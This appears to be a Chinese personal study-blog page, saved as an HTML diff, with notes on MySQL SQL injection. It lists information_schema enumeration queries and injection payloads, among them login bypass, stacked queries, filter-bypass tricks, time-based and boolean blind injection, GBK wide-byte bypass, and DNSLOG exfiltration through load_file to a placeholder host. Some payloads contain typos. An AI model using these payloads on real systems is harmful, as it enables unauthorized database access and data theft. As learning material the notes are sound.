@@ -1,0 +1,431 @@
+
+<!DOCTYPE html>
+<html lang="Zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>汐白学Web-SQL - 汐白的学习档案</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xibai,"> 
+    <meta name="description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,MySQL常用语句记录
+MySQL版本大于5.0时，有个默认数据库information_schema，里面存放着所有数据库的信息(比如表名、 列名、对应权限等)，通过这个数据库，我们就可以跨库查询,"> 
+    <meta name="author" content="Xibai"> 
+    <link rel="alternative" href="atom.xml" title="汐白的学习档案" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="汐白学Web-SQL - 汐白的学习档案"/>
+    <meta name="twitter:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,MySQL常用语句记录
+MySQL版本大于5.0时，有个默认数据库information_schema，里面存放着所有数据库的信息(比如表名、 列名、对应权限等)，通过这个数据库，我们就可以跨库查询,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="汐白的学习档案"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="汐白学Web-SQL - 汐白的学习档案"/>
+    <meta property="og:description" content="这里是正在努力追赶大佬的小可爱QAQ嘤嘤嘤,MySQL常用语句记录
+MySQL版本大于5.0时，有个默认数据库information_schema，里面存放着所有数据库的信息(比如表名、 列名、对应权限等)，通过这个数据库，我们就可以跨库查询,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">汐白的学习档案</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://xibai.xyz"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">汐白学Web-SQL</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">汐白学Web-SQL</h1>
+        <div class="stuff">
+            <span>二月 05, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="常用语句记录"><a href="#常用语句记录" class="headerlink" title="常用语句记录"></a>常用语句记录</h3><blockquote>
+<p>MySQL版本大于5.0时，有个默认数据库information_schema，里面存放着所有数据库的信息(比如表名、 列名、对应权限等)，通过这个数据库，我们就可以跨库查询，爆表爆列。</p>
+</blockquote>
+<p><code>information_schema.tables</code>：(这是<code>information_schema</code>中的<code>tables</code>表，存储的都是表的信息)</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>列名</th>
+<th>数据类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>TABLE_CATALOG</td>
+<td>nvarchar(128)</td>
+<td>表限定符。</td>
+</tr>
+<tr>
+<td>TABLE_SCHEMA</td>
+<td>nvarchar(128)</td>
+<td>表所有者。</td>
+</tr>
+<tr>
+<td>TABLE_NAME</td>
+<td>nvarchar(128)</td>
+<td>表名。</td>
+</tr>
+<tr>
+<td>COLUMN_NAME</td>
+<td>nvarchar(128)</td>
+<td>列名。</td>
+</tr>
+<tr>
+<td>ORDINAL_POSITION</td>
+<td>smallint</td>
+<td>列标识号。</td>
+</tr>
+<tr>
+<td>COLUMN_DEFAULT</td>
+<td>nvarchar(4000)</td>
+<td>列的默认值。</td>
+</tr>
+<tr>
+<td>IS_NULLABLE</td>
+<td>varchar(3)</td>
+<td>列的为空性。如果列允许 NULL，那么该列返回 YES。否则，返回 NO。</td>
+</tr>
+<tr>
+<td>DATA_TYPE</td>
+<td>nvarchar(128)</td>
+<td>系统提供的数据类型。</td>
+</tr>
+<tr>
+<td>CHARACTER_MAXIMUM_LENGTH</td>
+<td>smallint</td>
+<td>以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。有关更多信息，请参见数据类型。</td>
+</tr>
+<tr>
+<td>CHARACTER_OCTET_LENGTH</td>
+<td>smallint</td>
+<td>以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>NUMERIC_PRECISION</td>
+<td>tinyint</td>
+<td>近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>NUMERIC_PRECISION_RADIX</td>
+<td>smallint</td>
+<td>近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>NUMERIC_SCALE</td>
+<td>tinyint</td>
+<td>近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>DATETIME_PRECISION</td>
+<td>smallint</td>
+<td>datetime 及 SQL-92 interval 数据类型的子类型代码。对于其它数据类型，返回 NULL。</td>
+</tr>
+<tr>
+<td>CHARACTER_SET_CATALOG</td>
+<td>varchar(6)</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>CHARACTER_SET_SCHEMA</td>
+<td>varchar(3)</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 DBO，指明字符集的所有者名称。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>CHARACTER_SET_NAME</td>
+<td>nvarchar(128)</td>
+<td>如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>COLLATION_CATALOG</td>
+<td>varchar(6)</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 NULL。</td>
+</tr>
+<tr>
+<td>COLLATION_SCHEMA</td>
+<td>varchar(3)</td>
+<td>返回 DBO，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>COLLATION_NAME</td>
+<td>nvarchar(128)</td>
+<td>如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>DOMAIN_CATALOG</td>
+<td>nvarchar(128)</td>
+<td>如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>DOMAIN_SCHEMA</td>
+<td>nvarchar(128)</td>
+<td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 NULL。</td>
+</tr>
+<tr>
+<td>DOMAIN_NAME</td>
+<td>nvarchar(128)</td>
+<td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>爆库：<code>select SCHEMA_NAME from information_schema.SCHEMATA limit 1,5</code><br><code>limit 1,5</code> 表示从第一个数到第五个，在表中前五个值里面进行查询。</li>
+<li>爆表：<code>select table_name from information_schema.tables where table_schema=0×6D656D626572 limit 1,5</code><br><code>table_schema=0×6D656D626572</code> mysql中支持用整型的十六进制与字符串进行比较（这里判断其实部分是C语言的特性，c语言支持不同基础类型的数据直接比较，因为本质都是直接对比内存中存储的数据，但是不同的是C语言中整型变量为小端序，字符串为大端序；而在此时的mysql这里两者都为大端序，所以可以直接对比并通过）</li>
+<li>爆字段：<code>select COLUMN_NAME from information_schema.COLUMNS whereTABLE_NAME=0×61646D5F75736572 limit 5,1</code></li>
+</ul>
+<h3 id="基础注入姿势"><a href="#基础注入姿势" class="headerlink" title="基础注入姿势"></a>基础注入姿势</h3><h4 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h4><p>过于相信用户的输入，未对用户输入做严格的防范处理，导致用户直接构造了sql语句插入执行。</p>
+<p>比较经典的例子：</p>
+<ul>
+<li>互联网早期的万能密码：<code>1&#39; or 1=1&#39;;--#+</code></li>
+<li>堆叠注入：<code>1&#39;;show database;#--+</code></li>
+</ul>
+<h4 id="绕过型"><a href="#绕过型" class="headerlink" title="绕过型"></a>绕过型</h4><p>主要是过滤规则不够严谨，可以直接针对已知的过滤规则构造针对性的sql语句实现注入。</p>
+<p>遇到敏感词直接报错的：</p>
+<ul>
+<li>空格绕过：<code>select/**/*/**/from/**/table_name</code>。利用可控范围的注释符<code>/*</code>和<code>*/</code>代替空格作为字符隔断。</li>
+</ul>
+<p>遇到敏感词将其消除的：</p>
+<ul>
+<li>双写绕过：<code>1&#39; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</code>。部分开发者的过滤措施是将敏感词移除，双写绕过即针对此种类型。</li>
+</ul>
+<h3 id="进阶版注入姿势"><a href="#进阶版注入姿势" class="headerlink" title="进阶版注入姿势"></a>进阶版注入姿势</h3><p>进阶版并非完全脱离基础，基础才是灵魂，进阶版则是利用各种mysql自身特性来实现各种花式注入或者高难注入。</p>
+<h4 id="绕过引号或者黑名单限制"><a href="#绕过引号或者黑名单限制" class="headerlink" title="绕过引号或者黑名单限制"></a>绕过引号或者黑名单限制</h4><ul>
+<li>SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</li>
+<li>SELECT ‘a’ ‘d’ ‘mi’ ‘n’;</li>
+<li>SELECT CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</li>
+<li>SELECT CONCAT_WS(‘’, ‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</li>
+<li>SELECT GROUP_CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);</li>
+</ul>
+<blockquote>
+<p>concat 函数中只要存在参数值为 NULL，则返回结果就为 NULL</p>
+</blockquote>
+<h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>CASE, IF(), IFNULL(), NULLIF().</p>
+<ul>
+<li>SELECT CASE WHEN 1=1 THEN true ELSE false END;</li>
+<li>SELECT IF(1=1, true, false);</li>
+</ul>
+<p>这里的 <code>case</code> 和 <code>if</code> 的用法其实类似三元表达式</p>
+<ul>
+<li>SELECT IFNULL(NULL, 123);</li>
+<li>SELECT NULLIF(1=1, 123);</li>
+</ul>
+<p>如果前一个参数是 null，返回第二个参数，否则返回前一个参数</p>
+<h4 id="判断型（01型）"><a href="#判断型（01型）" class="headerlink" title="判断型（01型）"></a>判断型（01型）</h4><p>无法直接获取我们所构造的sql语句执行结果的信息，比如被过滤了没有警告，执行失败后台直接进行了异常处理看不到导致服务异常的现象等等。利用难度较高，主要是需要费劲心思挖掘测信道方面的信息并利用其进行大量的猜测和试错。</p>
+<p>这种情况下虽然服务本身没有出现可以利用的异常信息，但是当我们构造的命令使得其在两种或者更多中不同的正常状态间切换时，就可以据此判断我们构造的命令是否被执行，只要被执行了，就存在注入，至于如何利用，就是后话了。一般两种状态更方便，因为这大概率是开发者粗暴的将正常语句作为一类，不正常的语句作为一类进行的异常捕获，没有进行细节判断，会方便我们判断。</p>
+<ul>
+<li>时间盲注</li>
+</ul>
+<p>SLEEP(), BENCHMARK().</p>
+<p>select xxx from xxx where xxx=’’ - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(10000000,SHA1(‘true’)), false)) - ‘’;</p>
+<ul>
+<li>基础条件型盲注<br>构造执行<br><code>(select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128</code><br>然后不断修改最后比较的值，从而爆破处对应字符的值</li>
+</ul>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>国内最常使用的 <code>GBK</code> 编码，这种方式主要是绕过 <code>addslashes</code> 等对特殊字符进行转移的绕过。反斜杠 <code>\</code> 的十六进制为 <code>%5c</code>，在你输入 <code>%bf%27</code> 时，函数遇到单引号自动转移加入 <code>\</code>，此时变为 <code>%bf%5c%27</code>，<code>%bf%5c</code> 在 <code>GBK</code> 中变为一个宽字符「縗」。<code>%bf</code> 那个位置可以是 <code>%81-%fe</code> 中间的任何字符。不止在 <code>SQL</code> 注入中，宽字符注入在很多地方都可以应用。</p>
+<h4 id="DNSLOG-注入"><a href="#DNSLOG-注入" class="headerlink" title="DNSLOG 注入"></a>DNSLOG 注入</h4><p>DNS 在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
+<p>比如dnslog平台地址为：xxx.xxx</p>
+<ul>
+<li>select load_file(‘\\test.xxx.xxx.xxx\abc’);</li>
+<li>select load_file(concat(‘\\‘,(select database()),’.xxx.xxx.xxx\abc’));</li>
+</ul>
+<p>这里就是通过 <code>load_file</code> 的特性实现的</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="5cd24ed310c0cbc2a2ed"
+        data-cs="51aa998e509794b7b061784f1f3d41018af118f6"
+        data-r="xikong-mubai.github.io"
+        data-o="xikong-mubai"
+        data-a="xikong-mubai"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5%E8%AE%B0%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">常用语句记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text">基础注入姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">普通注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%9E%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">绕过型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E7%89%88%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.3.</span> <span class="toc-text">进阶版注入姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E6%88%96%E8%80%85%E9%BB%91%E5%90%8D%E5%8D%95%E9%99%90%E5%88%B6"><span class="toc-number">1.3.1.</span> <span class="toc-text">绕过引号或者黑名单限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">条件语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9E%8B%EF%BC%8801%E5%9E%8B%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">判断型（01型）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.4.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNSLOG-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.5.</span> <span class="toc-text">DNSLOG 注入</span></a></li></ol></li></ol></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+<!--血小板代码-->
+<link rel="stylesheet" href="/live2d/css/live2d.css" />
+<div id="landlord">
+    <div class="message" style="opacity:0"></div>
+    <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+    <div class="hide-button">隐藏</div>
+</div>
+<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = 'https://calmcenter.club/'
+</script>
+<script type="text/javascript" src="/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "/live2d/model/kesshouban_v2/model.json");
+</script>
+<!--血小板代码-->
+
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+</html>
